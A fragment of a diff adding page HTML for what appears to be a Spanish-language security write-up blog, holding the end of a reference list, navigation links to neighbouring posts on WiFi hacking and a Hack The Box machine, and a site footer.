noreferrer">https://kodigo.org/hablemos-de-ruby-on-rails-ruby-on-rails-que-es-y-para-que-sirve/</a></li><li><a href="https://www.reydes.com/d/?q=pdfinfo" target="_blank" rel="noopener noreferrer">https://www.reydes.com/d/?q=pdfinfo</a></li><li><a href="http://sedici.unlp.edu.ar/bitstream/handle/10915/139859/Presentaci%C3%B3n.pdf?sequence=3&amp;isAllowed=y" target="_blank" rel="noopener noreferrer">http://sedici.unlp.edu.ar/bitstream/handle/10915/139859/Presentaci%C3%B3n.pdf?sequence=3&amp;isAllowed=y</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/WiFi-Notes1/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Hacking WiFi - Modo Monitor y Falsificación de MAC de una Tarjeta de Red</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/htb-writeup-soccer/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">Soccer - Hack The Box</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
